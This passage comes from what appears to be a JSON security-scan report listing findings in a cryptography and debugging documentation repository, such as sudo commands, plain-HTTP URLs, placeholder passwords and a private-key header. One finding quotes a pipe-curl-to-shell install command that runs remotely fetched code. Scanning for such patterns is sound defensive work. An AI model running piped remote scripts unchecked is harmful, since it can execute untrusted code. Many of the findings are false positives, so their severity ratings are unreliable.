      "category": "Dangerous Command",
      "file": "skills/cryptography/encryption-at-rest/resources/REFERENCE.md",
      "line_number": 1183,
      "issue": "Privilege escalation",
      "evidence": "sudo fdesetup status",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/cryptography/encryption-at-rest/resources/REFERENCE.md",
      "line_number": 1186,
      "issue": "Privilege escalation",
      "evidence": "sudo fdesetup list",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/cryptography/key-management/resources/REFERENCE.md",
      "line_number": 2033,
      "issue": "Privilege escalation",
      "evidence": "sudo yum install -y aws-cloudhsmv2-cli",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/cryptography/key-management/resources/REFERENCE.md",
      "line_number": 2057,
      "issue": "User-controlled file path",
      "evidence": "with slot.open(user_pin='crypto-user:password') as session:",
      "recommendation": "Validate path is within allowed directory"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/cryptography/resources/hsm-integration/REFERENCE.md",
      "line_number": 707,
      "issue": "Privilege escalation",
      "evidence": "sudo yum install -y ./cloudhsm-client-latest.el7.x86_64.rpm",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/cryptography/resources/hsm-integration/REFERENCE.md",
      "line_number": 710,
      "issue": "Privilege escalation",
      "evidence": "sudo /opt/cloudhsm/bin/configure -a <cluster-HSM-IP>",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/cryptography/resources/hsm-integration/REFERENCE.md",
      "line_number": 713,
      "issue": "Privilege escalation",
      "evidence": "sudo systemctl start cloudhsm-client",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/cryptography/resources/hsm-integration/REFERENCE.md",
      "line_number": 796,
      "issue": "Privilege escalation",
      "evidence": "sudo dpkg -i yubihsm2-sdk/*.deb",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/cryptography/resources/hsm-integration/REFERENCE.md",
      "line_number": 799,
      "issue": "Privilege escalation",
      "evidence": "sudo systemctl start yubihsm-connector",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/cryptography/resources/hsm-integration/REFERENCE.md",
      "line_number": 800,
      "issue": "Privilege escalation",
      "evidence": "sudo systemctl enable yubihsm-connector",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/cryptography/resources/hsm-integration/REFERENCE.md",
      "line_number": 843,
      "issue": "Privilege escalation",
      "evidence": "sudo apt-get install softhsm2",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/cryptography/resources/hsm-integration/REFERENCE.md",
      "line_number": 846,
      "issue": "Privilege escalation",
      "evidence": "sudo yum install softhsm",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/cryptography/resources/hsm-integration/REFERENCE.md",
      "line_number": 856,
      "issue": "Privilege escalation",
      "evidence": "sudo make install",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/cryptography/resources/hsm-integration/REFERENCE.md",
      "line_number": 1978,
      "issue": "Unencrypted HTTP",
      "evidence": "signtool sign /f \"pkcs11:object=CodeSigningKey\" /fd SHA256 /tr http://timestamp.digicert.com application.exe",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/cryptography/resources/hsm-integration/examples/README.md",
      "line_number": 51,
      "issue": "Privilege escalation",
      "evidence": "sudo systemctl start yubihsm-connector",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/cryptography/resources/hsm-integration/examples/README.md",
      "line_number": 227,
      "issue": "Privilege escalation",
      "evidence": "sudo yum install -y ./cloudhsm-client-latest.el7.x86_64.rpm",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/cryptography/resources/hsm-integration/examples/README.md",
      "line_number": 230,
      "issue": "Privilege escalation",
      "evidence": "sudo /opt/cloudhsm/bin/configure -a <cluster-ip>",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/cryptography/resources/hsm-integration/examples/README.md",
      "line_number": 233,
      "issue": "Privilege escalation",
      "evidence": "sudo systemctl start cloudhsm-client",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/cryptography/resources/hsm-integration/examples/README.md",
      "line_number": 241,
      "issue": "Privilege escalation",
      "evidence": "sudo dpkg -i yubihsm2-sdk/*.deb",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/cryptography/resources/hsm-integration/examples/README.md",
      "line_number": 244,
      "issue": "Privilege escalation",
      "evidence": "sudo systemctl start yubihsm-connector",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/cryptography/resources/hsm-integration/examples/README.md",
      "line_number": 373,
      "issue": "Unencrypted HTTP",
      "evidence": "- [PKCS#11 Specification](http://docs.oasis-open.org/pkcs11/pkcs11-base/v2.40/pkcs11-base-v2.40.html)",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/cryptography/certificate-management/resources/REFERENCE.md",
      "line_number": 203,
      "issue": "Unencrypted HTTP",
      "evidence": "- OCSP: http://ocsp.letsencrypt.org",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/cryptography/certificate-management/resources/REFERENCE.md",
      "line_number": 204,
      "issue": "Unencrypted HTTP",
      "evidence": "- CA Issuers: http://cert.letsencrypt.org/letsencryptauthorityx3.der",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/cryptography/certificate-management/resources/REFERENCE.md",
      "line_number": 209,
      "issue": "Unencrypted HTTP",
      "evidence": "URI: http://crl.example.com/crl.pem",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/cryptography/certificate-management/resources/REFERENCE.md",
      "line_number": 787,
      "issue": "Privilege escalation",
      "evidence": "sudo apt install certbot python3-certbot-nginx",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/cryptography/certificate-management/resources/REFERENCE.md",
      "line_number": 790,
      "issue": "Privilege escalation",
      "evidence": "sudo yum install certbot python3-certbot-nginx",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/cryptography/certificate-management/resources/REFERENCE.md",
      "line_number": 829,
      "issue": "Privilege escalation",
      "evidence": "sudo systemctl enable certbot-renew.timer",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/cryptography/certificate-management/resources/REFERENCE.md",
      "line_number": 830,
      "issue": "Privilege escalation",
      "evidence": "sudo systemctl start certbot-renew.timer",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "CRITICAL",
      "category": "Network Security",
      "file": "skills/cryptography/certificate-management/resources/REFERENCE.md",
      "line_number": 863,
      "issue": "Pipe curl to shell",
      "evidence": "curl https://get.acme.sh | sh",
      "recommendation": "Download, verify, then execute"
    },
    {
      "severity": "HIGH",
      "category": "Hardcoded Secret",
      "file": "skills/cryptography/certificate-management/resources/REFERENCE.md",
      "line_number": 876,
      "issue": "Possible hardcoded token",
      "evidence": "export CF_Token=\"your-cloudflare-api-token\"  # Placeholder - replace with actual API token from Cloudflare dashboard",
      "recommendation": "Use environment variables or secret management"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/cryptography/certificate-management/resources/REFERENCE.md",
      "line_number": 894,
      "issue": "Force flag usage",
      "evidence": "acme.sh --renew -d example.com --force",
      "recommendation": "Ensure user understands consequences"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/cryptography/certificate-management/resources/REFERENCE.md",
      "line_number": 1194,
      "issue": "Unencrypted HTTP",
      "evidence": "proxy_pass http://backend;",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/cryptography/certificate-management/resources/REFERENCE.md",
      "line_number": 1352,
      "issue": "Unencrypted HTTP",
      "evidence": "wget http://crl.example.com/crl.pem",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/cryptography/certificate-management/resources/REFERENCE.md",
      "line_number": 1387,
      "issue": "Unencrypted HTTP",
      "evidence": "-url http://ocsp.letsencrypt.org -resp_text",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/cryptography/certificate-management/resources/REFERENCE.md",
      "line_number": 1882,
      "issue": "Force flag usage",
      "evidence": "certbot renew --force-renewal --cert-name example.com",
      "recommendation": "Ensure user understands consequences"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/cryptography/signing-verification/resources/REFERENCE.md",
      "line_number": 364,
      "issue": "Unencrypted HTTP",
      "evidence": "signtool sign /f certificate.pfx /p password /t http://timestamp.digicert.com myapp.exe",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/cryptography/signing-verification/resources/REFERENCE.md",
      "line_number": 1291,
      "issue": "Unencrypted HTTP",
      "evidence": "/t http://timestamp.digicert.com `",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/cryptography/signing-verification/resources/REFERENCE.md",
      "line_number": 1299,
      "issue": "Unencrypted HTTP",
      "evidence": "/t http://timestamp.digicert.com `",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/cryptography/signing-verification/resources/REFERENCE.md",
      "line_number": 1304,
      "issue": "Unencrypted HTTP",
      "evidence": "signtool sign /f cert.pfx /p password /t http://timestamp.digicert.com /fd SHA1 myapp.exe",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/cryptography/signing-verification/resources/REFERENCE.md",
      "line_number": 1305,
      "issue": "Unencrypted HTTP",
      "evidence": "signtool sign /f cert.pfx /p password /tr http://timestamp.digicert.com /fd SHA256 /as myapp.exe",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/cryptography/signing-verification/resources/REFERENCE.md",
      "line_number": 1523,
      "issue": "Unencrypted HTTP",
      "evidence": "- **Sectigo**: http://timestamp.sectigo.com",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/cryptography/signing-verification/resources/REFERENCE.md",
      "line_number": 1524,
      "issue": "Unencrypted HTTP",
      "evidence": "- **GlobalSign**: http://timestamp.globalsign.com/tsa/r6advanced1",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/cryptography/signing-verification/resources/REFERENCE.md",
      "line_number": 1705,
      "issue": "User-controlled file path",
      "evidence": "with token.open(user_pin='1234') as session:",
      "recommendation": "Validate path is within allowed directory"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/cryptography/signing-verification/resources/REFERENCE.md",
      "line_number": 1801,
      "issue": "User-controlled file path",
      "evidence": "session = self.token.open(user_pin=hsm_config['pin'])",
      "recommendation": "Validate path is within allowed directory"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/cryptography/signing-verification/resources/REFERENCE.md",
      "line_number": 2002,
      "issue": "Unencrypted HTTP",
      "evidence": "<Signature xmlns=\"http://www.w3.org/2000/09/xmldsig#\">",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "CRITICAL",
      "category": "Hardcoded Secret",
      "file": "skills/cryptography/signing-verification/resources/REFERENCE.md",
      "line_number": 2365,
      "issue": "Private key in file",
      "evidence": "private_key = \"\"\"-----BEGIN PRIVATE KEY-----",
      "recommendation": "Never commit private keys"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/cryptography/signing-verification/resources/REFERENCE.md",
      "line_number": 2669,
      "issue": "User-controlled file path",
      "evidence": "session = token.open(user_pin=pin)",
      "recommendation": "Validate path is within allowed directory"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/cryptography/signing-verification/resources/REFERENCE.md",
      "line_number": 2833,
      "issue": "Unencrypted HTTP",
      "evidence": "signtool sign /f cert.pfx /p password /t http://timestamp.digicert.com /fd SHA256 app.exe",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/cryptography/signing-verification/resources/REFERENCE.md",
      "line_number": 2849,
      "issue": "Unencrypted HTTP",
      "evidence": "- Sectigo: http://timestamp.sectigo.com",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/cryptography/signing-verification/resources/REFERENCE.md",
      "line_number": 2903,
      "issue": "Unencrypted HTTP",
      "evidence": "- **PKCS#11 Specification**: http://docs.oasis-open.org/pkcs11/",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/cryptography/pki-fundamentals/resources/REFERENCE.md",
      "line_number": 226,
      "issue": "Unencrypted HTTP",
      "evidence": "crlDistributionPoints = URI:http://crl.example.com/root.crl",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/cryptography/pki-fundamentals/resources/REFERENCE.md",
      "line_number": 227,
      "issue": "Unencrypted HTTP",
      "evidence": "authorityInfoAccess = OCSP;URI:http://ocsp.example.com",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/cryptography/pki-fundamentals/resources/REFERENCE.md",
      "line_number": 284,
      "issue": "Unencrypted HTTP",
      "evidence": "OCSP - URI:http://ocsp.example.com",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/cryptography/pki-fundamentals/resources/REFERENCE.md",
      "line_number": 285,
      "issue": "Unencrypted HTTP",
      "evidence": "CA Issuers - URI:http://ca.example.com/intermediate.crt",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/cryptography/pki-fundamentals/resources/REFERENCE.md",
      "line_number": 288,
      "issue": "Unencrypted HTTP",
      "evidence": "URI:http://crl.example.com/intermediate.crl",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/cryptography/pki-fundamentals/resources/REFERENCE.md",
      "line_number": 368,
      "issue": "Unencrypted HTTP",
      "evidence": "OCSP - URI:http://ocsp.example.com",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/cryptography/pki-fundamentals/resources/REFERENCE.md",
      "line_number": 369,
      "issue": "Unencrypted HTTP",
      "evidence": "CA Issuers - URI:http://ca.example.com/intermediate.crt",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/cryptography/pki-fundamentals/resources/REFERENCE.md",
      "line_number": 374,
      "issue": "Unencrypted HTTP",
      "evidence": "URI:http://crl.example.com/intermediate.crl",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/cryptography/pki-fundamentals/resources/REFERENCE.md",
      "line_number": 488,
      "issue": "Unencrypted HTTP",
      "evidence": "authorityInfoAccess = OCSP;URI:http://ocsp.example.com",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/cryptography/pki-fundamentals/resources/REFERENCE.md",
      "line_number": 489,
      "issue": "Unencrypted HTTP",
      "evidence": "crlDistributionPoints = URI:http://crl.example.com/intermediate.crl",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/cryptography/pki-fundamentals/resources/REFERENCE.md",
      "line_number": 752,
      "issue": "Unencrypted HTTP",
      "evidence": "http://crl.example.com/intermediate.crl",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/cryptography/pki-fundamentals/resources/REFERENCE.md",
      "line_number": 760,
      "issue": "Unencrypted HTTP",
      "evidence": "URI:http://crl.example.com/intermediate.crl",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/cryptography/pki-fundamentals/resources/REFERENCE.md",
      "line_number": 822,
      "issue": "Unencrypted HTTP",
      "evidence": "-url http://ocsp.example.com \\",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/cryptography/pki-fundamentals/resources/REFERENCE.md",
      "line_number": 1160,
      "issue": "Path traversal pattern",
      "evidence": "cd ../intermediate",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/cryptography/pki-fundamentals/resources/REFERENCE.md",
      "line_number": 1169,
      "issue": "Path traversal pattern",
      "evidence": "cd ../root",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/cryptography/pki-fundamentals/resources/REFERENCE.md",
      "line_number": 1172,
      "issue": "Path traversal pattern",
      "evidence": "-in ../intermediate/csr/intermediate.csr \\",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/cryptography/pki-fundamentals/resources/REFERENCE.md",
      "line_number": 1173,
      "issue": "Path traversal pattern",
      "evidence": "-out ../intermediate/certs/intermediate-cert.pem",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/cryptography/pki-fundamentals/resources/REFERENCE.md",
      "line_number": 1176,
      "issue": "Path traversal pattern",
      "evidence": "cat ../intermediate/certs/intermediate-cert.pem \\",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/cryptography/pki-fundamentals/resources/REFERENCE.md",
      "line_number": 1177,
      "issue": "Path traversal pattern",
      "evidence": "certs/ca-cert.pem > ../intermediate/certs/ca-chain.pem",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/cryptography/pki-fundamentals/resources/REFERENCE.md",
      "line_number": 1180,
      "issue": "Path traversal pattern",
      "evidence": "cd ../intermediate",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/cryptography/pki-fundamentals/resources/REFERENCE.md",
      "line_number": 1782,
      "issue": "Unencrypted HTTP",
      "evidence": "issuing_certificates=\"http://vault.example.com:8200/v1/pki/ca\" \\",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/cryptography/pki-fundamentals/resources/REFERENCE.md",
      "line_number": 1783,
      "issue": "Unencrypted HTTP",
      "evidence": "crl_distribution_points=\"http://vault.example.com:8200/v1/pki/crl\"",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/cryptography/pki-fundamentals/resources/REFERENCE.md",
      "line_number": 2165,
      "issue": "Unencrypted HTTP",
      "evidence": "curl -I http://crl.example.com/intermediate.crl",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/cryptography/pki-fundamentals/resources/REFERENCE.md",
      "line_number": 2168,
      "issue": "Unencrypted HTTP",
      "evidence": "openssl ocsp -issuer ca.pem -cert cert.pem -url http://ocsp.example.com -CAfile ca.pem",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/cryptography/pki-fundamentals/resources/REFERENCE.md",
      "line_number": 2376,
      "issue": "Unencrypted HTTP",
      "evidence": "openssl ocsp -issuer ca.pem -cert cert.pem -url http://ocsp.example.com",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "HIGH",
      "category": "Hardcoded Secret",
      "file": "skills/cryptography/secrets-rotation/resources/REFERENCE.md",
      "line_number": 992,
      "issue": "Possible hardcoded password",
      "evidence": "password=\"admin_password\"  # Example only - use actual credentials from secure storage",
      "recommendation": "Use environment variables or secret management"
    },
    {
      "severity": "HIGH",
      "category": "Hardcoded Secret",
      "file": "skills/cryptography/secrets-rotation/resources/REFERENCE.md",
      "line_number": 1300,
      "issue": "Possible hardcoded password",
      "evidence": "admin_password='admin_password'  # Example only - use environment variable or secret manager",
      "recommendation": "Use environment variables or secret management"
    },
    {
      "severity": "HIGH",
      "category": "Hardcoded Secret",
      "file": "skills/cryptography/secrets-rotation/resources/REFERENCE.md",
      "line_number": 1494,
      "issue": "Possible hardcoded password",
      "evidence": "password='old_password'  # Example only - use environment variable or secret manager",
      "recommendation": "Use environment variables or secret management"
    },
    {
      "severity": "HIGH",
      "category": "Hardcoded Secret",
      "file": "skills/cryptography/secrets-rotation/resources/REFERENCE.md",
      "line_number": 2314,
      "issue": "Possible hardcoded password",
      "evidence": "password: \"my_password_123\"  # Plaintext in config - example only",
      "recommendation": "Use environment variables or secret management"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/cryptography/secrets-rotation/resources/examples/07_emergency_rotation_runbook.md",
      "line_number": 383,
      "issue": "Unencrypted HTTP",
      "evidence": "curl -s http://prometheus:9090/api/v1/query?query='up{job=\"myapp\"}' | jq '.data.result[].value[1]'",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/cryptography/tls-configuration/resources/REFERENCE.md",
      "line_number": 751,
      "issue": "Unencrypted HTTP",
      "evidence": "proxy_pass http://backend;",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/cryptography/tls-configuration/resources/scripts/README.md",
      "line_number": 309,
      "issue": "Path traversal pattern",
      "evidence": "- `../REFERENCE.md` - Detailed TLS specifications and RFCs",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/cryptography/tls-configuration/resources/scripts/README.md",
      "line_number": 310,
      "issue": "Path traversal pattern",
      "evidence": "- `../examples/` - Example configurations",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/cryptography/tls-configuration/resources/scripts/README.md",
      "line_number": 311,
      "issue": "Path traversal pattern",
      "evidence": "- Main skill: `../../tls-configuration.md`",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/debugging/distributed-systems-debugging.md",
      "line_number": 122,
      "issue": "Unencrypted HTTP",
      "evidence": "\"http://inventory-service/api/reserve\",",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/debugging/distributed-systems-debugging.md",
      "line_number": 140,
      "issue": "Unencrypted HTTP",
      "evidence": "\"http://payment-service/api/charge\",",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/debugging/distributed-systems-debugging.md",
      "line_number": 148,
      "issue": "Unencrypted HTTP",
      "evidence": "\"http://inventory-service/api/release\",",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/debugging/distributed-systems-debugging.md",
      "line_number": 583,
      "issue": "Privilege escalation",
      "evidence": "sudo ntpdate pool.ntp.org",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/debugging/distributed-systems-debugging.md",
      "line_number": 586,
      "issue": "Privilege escalation",
      "evidence": "sudo timedatectl set-ntp true",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/debugging/distributed-systems-debugging.md",
      "line_number": 763,
      "issue": "Unencrypted HTTP",
      "evidence": "requests.get(\"http://service-b/api/data\")",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/debugging/distributed-systems-debugging.md",
      "line_number": 768,
      "issue": "Unencrypted HTTP",
      "evidence": "requests.get(\"http://service-b/api/data\", headers=headers)",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/debugging/core-dump-analysis.md",
      "line_number": 130,
      "issue": "Privilege escalation",
      "evidence": "sudo mkdir -p /etc/systemd/system.conf.d/",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/debugging/core-dump-analysis.md",
      "line_number": 131,
      "issue": "Privilege escalation",
      "evidence": "cat <<EOF | sudo tee /etc/systemd/system.conf.d/coredump.conf",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/debugging/core-dump-analysis.md",
      "line_number": 136,
      "issue": "Privilege escalation",
      "evidence": "sudo systemctl daemon-reexec",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/debugging/core-dump-analysis.md",
      "line_number": 139,
      "issue": "Privilege escalation",
      "evidence": "echo '/var/crash/core.%e.%p.%t' | sudo tee /proc/sys/kernel/core_pattern",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/debugging/core-dump-analysis.md",
      "line_number": 331,
      "issue": "Privilege escalation",
      "evidence": "sudo pystack remote --pid 12345",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/debugging/core-dump-analysis.md",
      "line_number": 631,
      "issue": "Privilege escalation",
      "evidence": "echo '/var/crash/core.%e.%p.%t' | sudo tee /proc/sys/kernel/core_pattern",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/debugging/crash-debugging.md",
      "line_number": 321,
      "issue": "Privilege escalation",
      "evidence": "sudo make install",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/debugging/production-debugging.md",
      "line_number": 247,
      "issue": "Unencrypted HTTP",
      "evidence": "curl -X POST http://api.example.com/admin/log-level \\",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/debugging/production-debugging.md",
      "line_number": 253,
      "issue": "Unencrypted HTTP",
      "evidence": "curl -X POST http://api.example.com/admin/log-level \\",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/debugging/gdb-fundamentals.md",
      "line_number": 534,
      "issue": "Privilege escalation",
      "evidence": "sudo sysctl -w kernel.core_pattern=/tmp/core.%e.%p",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/debugging/lldb-macos-debugging.md",
      "line_number": 694,
      "issue": "Privilege escalation",
      "evidence": "sudo sysctl -w kern.corefile=/tmp/core.%P",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/debugging/container-debugging.md",
      "line_number": 360,
      "issue": "Unencrypted HTTP",
      "evidence": "kubectl exec -it <pod_name> -- wget -O- http://service-name:8080/health",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
